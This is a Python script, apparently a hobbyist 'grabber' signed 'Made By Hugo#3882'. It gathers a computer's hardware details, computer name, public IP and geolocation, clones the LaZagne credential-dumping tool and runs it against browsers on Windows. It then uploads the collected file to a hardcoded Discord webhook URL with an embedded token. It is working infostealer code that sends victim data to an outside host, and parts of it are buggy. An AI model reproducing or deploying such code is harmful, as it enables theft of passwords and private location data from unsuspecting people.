import time
import tkinter as tk
import platform
import psutil
import cpuinfo
import wmi
import requests
import platform
import subprocess
import os
from discord_webhook import DiscordEmbed, DiscordWebhook
try:
    os.environ.pop('PYTHONIOENCODING')
except KeyError:
    pass

hook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1074360920400216074/qRKlyzCp_deTV3iiywGm2ZOo3b1LKN6A0DxwzXyZUMmZM118CQhjAQ-0Dmhu5Oy5Cd6H")
            
__L01__=("            ▄▄▄▄                      ")
__L02__=("    ▓█████▄ ▓█   ▀▒████▄    ▓██ ▒ ██▒ ")
__L03__=("    ▒██▒ ▄██▒███  ▒██  ▀█▄  ▓██ ░▄█ ▒ ")
__L04__=("    ▒██░█▀  ▒▓█  ▄░██▄▄▄▄██ ▒██▀▀█▄   ")
__L05__=("    ░▓█  ▀█▓░▒████▒▓█   ▓██▒░██▓ ▒██▒ ")
__L06__=("    ░▒▓███▀▒░░ ▒░ ░▒▒   ▓▒█░░ ▒▓ ░▒▓░ ")
__L07__=("    ▒░▒   ░  ░ ░  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ ")
__L08__=("    ░    ░    ░    ░   ▒     ░░   ░   ")
__L09__=("    ░         ░  ░     ░  ░   ░       ")
__L010__=("        ░                            ")

__L177__=(__L01__+"\n"+__L02__+"\n"+__L03__+"\n"+__L04__+"\n"+__L05__+"\n"+__L06__+"\n"+__L07__+"\n"+__L08__+"\n"+__L09__+"\n"+__L010__)

print("Made By Hugo#3882")

print(__L177__)

fileABtPC = open('AboutPC.txt', 'a')

BatLoadingInt = 0
BatLoading0 = (" ! ! ! ")
BatLoading1 = (" █ ! ! ")
BatLoading2 = (" ! █ ! ")
BatLoading3 = (" ! ! █ ")

#print("Injecting...")
#print(BatLoading0)
#time.sleep(1)
#print(BatLoading1)
#time.sleep(1)
#print(BatLoading2)
#time.sleep(1)
#print(BatLoading3)
#time.sleep(1)
#print(BatLoading0)
#time.sleep(1)
#print(BatLoading1)
#time.sleep(1)
#print(BatLoading2)
#time.sleep(1)
#print(BatLoading3)
#time.sleep(1)
#print(BatLoading0)
#time.sleep(1)
#print(BatLoading1)
#time.sleep(0.315179)

pc = wmi.WMI()
### General
fileABtPC.write(f"Architecture : \n{platform.architecture()}\n")
fileABtPC.write(f"Computer Name : \n{platform.node()}\n")
fileABtPC.write(f"Operating System : \n{platform.platform()}\n")
### Processor
fileABtPC.write(f"Processor : \n{platform.processor()}\n")
### CPU Info
my_cpuinfo = cpuinfo.get_cpu_info()
fileABtPC.write(f"Full CPU Name : \n{my_cpuinfo['brand_raw']}")
### Ram Storage
fileABtPC.write(f"Total RAM : \n{psutil.virtual_memory().total / 1024 / 1024 / 1024:.2f} GB\n")
### GPU Info
fileABtPC.write(f"GPU Information : \n{pc.Win32_VideoController()[0].name}\n \n ------------------------------------ \n \n")


embed = DiscordEmbed(title='Hugos Insanxity', color=242424)

embed.set_author(name='About PC')
embed.set_timestamp()
with open('AboutPC.txt', "rb") as f:
    hook.add_file(file=f.read(), filename="AboutPC.txt")

print("Loaded PC Specs")

r = requests.get('https://get.geojs.io/')

ip_requests = requests.get('https://get.geojs.io/v1/ip.json')
ipAdd = ip_requests.json()['ip']
fileABtPC.write(ipAdd)

url = 'https://get.geojs.io/v1/ip/geo/'+ipAdd+'.json'
geo_r = requests.get(url)
geo_data = geo_r.json()

fileABtPC.write(f"Computers Latitude : \n{geo_data['latitude']}\n")
fileABtPC.write(f"Computers Longitude :  \n{geo_data['longitude']}\n")
fileABtPC.write(f"Computers City :  \n{geo_data['city']}\n")
fileABtPC.write(f"Computers Region :  \n{geo_data['region']}\n")
fileABtPC.write(f"Computers Country :  \n{geo_data['country']}\n")

fileABtPC.close()

os = platform.uname()[0]

if os == "Windows": 
    subprocess.Popen('cd C:\\Users\\%USERNAME%\\Desktop', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, shell=True).communicate()[0]
    time.sleep(0.1)
    subprocess.Popen('git clone https://github.com/AlessandroZ/LaZagne.git', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, shell=True).communicate()[0]
    time.sleep(5)
    hujsedchrguicsehnio=subprocess.Popen('lazagne.exe browsers', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, shell=True).communicate()[0]
    print(hujsedchrguicsehnio)

elif os == "Linux":
    subprocess.Popen('git clone https://github.com/AlessandroZ/LaZagne.git', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, shell=True).communicate()[0]

elif os == "MacOS":
    waitingcmd345607=subprocess.Popen('brew install git', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, shell=True).communicate()[0]
    waitingcmd345607.wait()
    subprocess.Popen('git clone https://github.com/AlessandroZ/LaZagne.git', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, shell=True).communicate()[0]

else:
    print("Incorrect System Err.")

hook.add_embed(embed)
response = hook.execute()

print("Loaded!")
